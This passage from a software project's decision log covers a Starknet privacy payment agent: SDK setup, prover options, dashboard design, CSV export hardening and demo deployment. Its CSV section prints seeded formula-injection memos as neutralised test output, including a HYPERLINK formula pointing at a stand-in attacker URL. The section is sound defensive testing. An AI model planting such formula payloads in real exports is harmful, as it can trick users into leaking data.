deleted and `package.json` points at the registry version. D-005 is closed.

**The workaround verified itself on the way out.** Before switching, the dist built from source at
commit `66e3caa` was diffed against the published tarball: 55 files, **byte-identical**. So every
test run over the preceding hours was exercising the real published SDK, not an approximation —
which is the reassurance a from-source workaround normally cannot give.

Two gotchas worth keeping, because neither is in the docs:

1. **`gh auth refresh` needs a terminal that can prompt.** It failed with
   `could not prompt: unexpected escape sequence from terminal: ['\x1b' ']']` in a mobile/remote
   terminal that was answering an OSC-11 colour query onto stdin. There is no flag to skip the
   prompt (checked `gh auth refresh --help`, v2.97.0). Run it from a desktop terminal.
2. **Refreshing the gh token does not update npm.** `~/.npmrc` keeps the old value, so the 403
   continues until `npm config set '//npm.pkg.github.com/:_authToken' "$(gh auth token)"` is run
   afterwards.

`scripts/vendor-sdk.sh` stays as a documented fallback rather than being deleted — the scope may not
be available on whatever machine a judge uses.

### D-037 — Self-hosted proving is a real fallback, but not on this laptop

Investigated while #147 stayed silent. The findings change the Gate G1 options, so they are recorded
even though the path was not taken.

**The prover is publicly available.** The compatibility matrix in the SDK monorepo's README points
at `ghcr.io/starkware-libs/starknet-privacy/transaction-prover:PRIVACY-0.14.3-RC.2`, and the
manifest pulls **without authentication**. Both `linux/amd64` and `linux/arm64` are published.

**And it does not need Pathfinder.** The matrix lists Pathfinder alongside it, which reads like a
requirement; the prover's own README says otherwise — *"the prover can point to any Starknet RPC
endpoint"*, the only constraint being v0.10 API support. Our Alchemy endpoints are already
`.../rpc/v0_10/...`. That is a far lower bar than the matrix implies: no full node to sync.

**Two things stop it here:**

1. **The published arm64 image dies with SIGILL on Apple Silicon.** The binary is genuinely aarch64
   (ELF `e_machine = 0xb7`), but `--version` exits 132 with no output at all — it uses instructions
   this CPU does not implement, presumably built for a Neoverse-class target. Worth reporting
   upstream: anyone developing on an Apple laptop hits this immediately.
2. **The hardware ask is serious.** The prover's README specifies a *c4d-highcpu-48 or equivalent*
   — 48 vCPU, 96 GB RAM — and notes that proving performance is highly machine-dependent. Owner's
   call, and the right one: not worth burning a laptop on.

**What this means for G1.** There are now **two** fallbacks, not one, and the new one is better:

| Fallback | Keeps the agent autonomous? | Cost |
|---|---|---|
| **Self-hosted prover on a rented Linux box** | **yes** — this is the SDK route, unchanged | a few hours + a cloud instance |
| Wallet-API route (agent proposes, owner's wallet signs) | no — a human taps every payment | a rebuild of the spending path |

Self-hosting preserves the entire premise of the project; the Wallet-API route contradicts it. So if
#147 stays silent past Day 3, **rent a machine before rewriting the architecture**.

### D-038 — The dashboard is a server, and its activity view has three visibility levels

**A server, not a static page.** Reading shielded balances needs the viewing key, which never leaves
the server (hard rule 1). It binds to loopback only and has no authentication because it has no
network path — so the public `demo_url` should be the claim page, not this. Exposing it later means
adding auth first.

**Two sources, tagged.** `policy` rows are what the agent *asked for*, refusals included — those
never reach the chain and are the entire point of an audit view. `chain` rows are what *settled*.
Merged without the tag, a denied payment reads as a completed one.

**Attribution is asymmetric.** The pool's `Deposit` event indexes the depositor, so shields are
attributable to us — read from the event's **first indexed key**, never `transaction.sender`, which
is the relayer and identical for every user. `Withdrawal` encrypts the initiator and indexes only
the recipient, so unshields appear from Kese's own record and not from Starknet. The page says this
rather than under-reporting and looking precise.

Verified against **real mainnet data**: 16 deposits across **10 distinct depositors**. Had the
filter been reading the sender, that count would have been 1 — which is exactly how this bug hides.

**Three visibility levels, not two.** The first draft labelled a claim link "private". It is not:
the escrow pays through an *open* note, which carries its value in plaintext. The recipient stays
hidden, the amount does not — so `amount-public` is its own level. Caught by reading the rendered
table rather than by a test, which is now the fourth or fifth time that has been the case today.

### D-039 — The spend report is a spreadsheet attack surface

The CSV export is where "privacy from the world, not from you" is actually honoured — the owner
hands it to an accountant. Opening it in a spreadsheet changes the threat model completely.

A cell beginning `=`, `+`, `-` or `@` is a **formula** in Excel, Sheets and LibreOffice. Two fields
in this report are caller-supplied: the memo, written by an LLM, and the counterparty address. And
the LLM writes the memo from whatever it was told — so a payment request is a delivery vehicle for
a formula that runs on the owner's own machine, at the moment they open their own accounts.

Worse, **the payment does not have to succeed**. Refused attempts are recorded too, which is the
whole point of an audit trail — so a request the policy engine rejects still lands its memo in the
file.

Every caller-supplied field is therefore **neutralised**, not merely escaped: escaping fixes commas
and quotes and does nothing about formulas. A leading apostrophe is the conventional fix —
spreadsheets read it as "this is text", show the rest verbatim, and strip it on display. Neutralised
rather than stripped, deliberately: a memo that tried to inject a formula is exactly the thing the
owner should be able to see.

Verified end to end by seeding two hostile memos and downloading the file:

```
'@SUM(A1:A99)
"'=HYPERLINK(""http://evil.example/steal"",""Refund pending"")"
"invoice 4471, Acme hosting"
```

Hostile ones inert, the benign one only quoted for its comma.

**Also added:** `memo` now persists in the decision log. Without it the report says an amount left
and nothing about what for, which is not an audit trail an accountant can use.

### D-040 — Mainnet dry run passes, and the eligibility rule is cheaper than we thought

Ran the smoke test against **mainnet** in simulate mode — read-only plus node simulation, nothing
submitted, no funds at risk.

**The client works against the real mainnet pool today.** `discoverRequirement` returns `Register`,
`discoverNotes` returns zero, and a shield **compiles and is executed by the node** — all of this
while our account is not even deployed on mainnet, because `CallMockProofProvider` simulates with
validation skipped. So day 8 is a funding-and-submitting exercise, not a debugging session.

Note the pools are *not* the same build: mainnet class `0x67dddd89d80f…`, Sepolia
`0x56ab118a8a6e…`, both reporting `get_version() = 2.0`. Compatibility is confirmed empirically
rather than by version string, since our reads exercise many of their view methods.

**Numbers read from the chain, not assumed:**

| | mainnet | sepolia |
|---|---|---|
| `get_fee_amount` (per private operation) | **6** | 2 |
| `get_proof_validity_blocks` | 450 | 450 |

The skill's reference said the mainnet fee was 4 and warned to read it rather than assume. It was
right to warn: it is 6. It is charged **per operation**, so a full register + shield + transfer +
withdraw run costs 4× that before gas.

**Eligibility is broader than this repo believed.** `docs/strk20-notes.md` §9 said the check counts
the `Deposit` event's `user_addr`. The Day-0 guide actually says each hash "must exist, have
succeeded, and carry a STRK20 pool event" — *any* pool event. The `user_addr` point is a different
lesson from the same guide (never attribute by transaction sender, because relayers submit). Both
true; only one is the rule. Corrected in the notes.

**Funding estimate for Phase M**, so it is a decision and not a surprise: three pool operations at
6 STRK is 18 in fees, plus a few STRK actually shielded, plus gas and the account deploy, plus the
unverified ~24 STRK proving reserve from #121 if that turns out to be real. **Budget ~45–50 STRK**
to be comfortable; the guide's own line is "three transactions of a few STRK each".

---

## D-041 — Writing the README exposed three things that did not work

**Date:** 2026-08-21 · **Phase:** D · **Status:** fixed

Documenting the project for judges meant asserting, in writing, that specific commands work. Three
of those assertions turned out to be false. None had failed a test, because none was covered by
one — they were all in the seam between the code and the person running it.

**1. `pnpm escrow:build` / `escrow:test` failed on any PATH containing a space.** Both inlined
`bash -c "export PATH=$HOME/...:$PATH && ..."`. npm expands that through `sh` *before* bash parses
it, so the literal contents of PATH were spliced into the command text; on macOS, "Application
Support" ended the assignment at the space and the remainder became stray commands. 22 entries on
this machine had spaces. The obvious fix — look the tools up on PATH — has its own trap:
`command -v scarb` **succeeds** on an asdf install while `scarb` still fails, because the shim on
PATH re-execs through an `asdf` binary a non-interactive shell cannot see. Existence is not the
test. `scripts/cairo.sh` now probes each candidate by running it, and quotes properly.

**2. `packages/mcp` had no runnable entrypoint.** `index.ts` was a barrel of exports;
`node dist/index.js` loaded a module and exited. The README's MCP config block — the single thing a
judge would actually try — did nothing. `createKeseMcpServer()` was fully tested, but nothing
constructed its dependencies, wired a transport, or loaded configuration. A tested factory with no
caller is not a product. `src/main.ts` is now that caller.

**3. Everything read `.env` relative to the cwd.** Fine while every entrypoint was launched from
the repo root by hand; wrong for both launchers that matter. `pnpm --filter @kese/dashboard dev`
runs from `apps/dashboard/`, and an MCP client spawns its server from wherever it likes. The
dashboard's fail-closed check then reported nine missing variables — correct behaviour, wrong
reason, and it reads as an operator mistake rather than a lookup failure. `loadDotEnv()` in
`@kese/core` climbs from the module's own directory as well as the cwd, nearest file wins.

**The consequential half of #3 was not the `.env`.** `POLICY_DB_PATH` defaults to
`./kese-policy.sqlite`, also cwd-relative. That file holds the **idempotency records**. Launched
from a different directory, the server silently opens a *different, empty* database — so a retried
payment whose key lives in the other file is not recognised as a replay and executes a second time.
Hard rule 3 says the same key must never re-execute; that guarantee is only as durable as the file
it is stored in. Relative paths are now resolved against the project root, not the caller.

**Also fixed while in there:** `main.ts` releases reservations left holding budget by approvals that
did not survive a restart. `pendingReservations()` existed and was tested, but had no production
caller, so a crash during a pending approval held daily budget until the rolling window slid past
it — up to a day.

**The pattern, again.** Every one of these is a confident-but-wrong surface: a script that reports
success from a stale build, a server that "starts" without serving, a database that is present but
empty. Tests did not catch them because tests import functions; users run programs. Writing down
"here is the command you type" and then typing it is what caught all three.

**Verified:** the built server, spawned from `$HOME`, completes an MCP `initialize` + `tools/list`
handshake, lists all six tools, keeps stdout free of anything but JSON-RPC, resolves the policy
database back to the repo, and prints its status to stderr. `pnpm dashboard` serves live pool data.
301 TS tests, 19 Cairo tests, typecheck clean.

---

## D-042 — The public demo ships without a credential on Vercel

**Date:** 2026-08-21 · **Phase:** D · **Status:** live at https://kese-claim.vercel.app

`demo_url` is the claim page. It cannot be the dashboard: that shows private balances over a
loopback server with no authentication, and the absence of auth is only safe because there is no
network path to it (see `apps/dashboard/src/server.ts`).

**Three things had to be settled before publishing.**

**1. The RPC URL is public.** Vite inlines `VITE_*` into the browser bundle, and this project's
`RPC_URL_SEPOLIA` is an Alchemy endpoint with the key in the path. Building the page with the
repo's own `.env` would have published that key in a JavaScript file. The deployment uses a
keyless public endpoint instead — `https://api.cartridge.gg/x/starknet/sepolia`, picked by testing
candidates against the actual call the page makes rather than by reputation: Blast is retired,
Lava had no pairings, and Nethermind's free endpoint returned nothing. The live bundle was
re-checked for `alchemy`, `infura`, `ACCOUNT_PRIVATE_KEY`, `VIEWING_KEY` and `TELEGRAM` after
deploying, not only before.

**2. Building on Vercel would have needed a token, so it does not build from this repo.** The
workspace root depends on `@starkware-libs/starknet-privacy-sdk` from GitHub Packages, so a plain
`pnpm install` fails there — and `@kese/core` depends on it too, so filtering the install does not
help. Storing a `read:packages` token on Vercel would put a credential in a third-party service in
order to install a package the claim page never uses: it reads the escrow with plain starknet.js,
and claiming runs inside the visitor's own wallet. The deployment therefore carries its own
`package.json` with the three packages the page actually needs. Every other file is copied verbatim
to the same relative path, so `package.json` is the only file that can drift.

`scripts/build-vercel-tree.mjs` assembles that tree, and its output was verified to rebuild the
**exact artifact now serving** — same content hash, `index-B2G05xJk.js`. Redeploying is mechanical,
not remembered.

**3. A demo URL that says "you are in the wrong place" is not a demo.** The no-link screen was
written for a recipient who copied half a link. It now keeps that instruction first and then
explains the project, and it offers the four recipient screens as samples. Those were previously
stripped from production builds; they ship now because `render()` enforces a banner and withholds
the click listener, which is a stronger guarantee than absence — and because the screen carrying
the "the amount is public" notice was otherwise unreviewable by anyone without a dev server.

**Not claimed:** there is no funded claim link behind the demo, because creating one still needs
the proving service. The samples say so on their face.

**Addendum (same day) — the demo now builds from git, and moved to `kese-claim.vercel.app`.**

The first deployment was a file upload, which meant every update would be a manual re-upload and
the live page could silently drift from `main`. `vercel.json` now drives the build from the
repository on every push.

The obstacle was never the wiring. It was that a normal install on Vercel fails: the workspace root
*and* `@kese/core` depend on the Privacy SDK from GitHub Packages, so nothing short of a
`read:packages` token gets `pnpm install` through — and that would mean storing a credential in a
third-party service to install a package the claim page never uses. So the install command swaps in
`apps/claim/vercel/package.json`, listing only the three packages the page needs plus vite. The
checkout is ephemeral, so overwriting the root manifest there costs nothing.

Rehearsed before pushing, against a fresh clone of `origin/main` with npm's user *and* global config
pointed at empty files so the developer's own token could not make it pass: 91 packages installed,
`@starkware-libs` never requested, and the build produced `index-B2G05xJk.js` — the same content
hash as the artifact then serving. Vercel's own build produced that hash too.

**Why the URL changed.** Vercel's API can create a git-linked project but cannot link an existing
one, and the name `kese` was already taken by the upload-based project — which the API also offers
no way to delete. Rather than keep two live copies of the demo, one of which would go stale, the
git-linked project is `kese-claim` and the old one is paused. `kese-claim.vercel.app` is also the
better name for a link a real recipient receives, which was the runner-up when the name was chosen.
Moving now cost nothing: no external document pointed at the old URL yet. It would not have stayed
cheap.
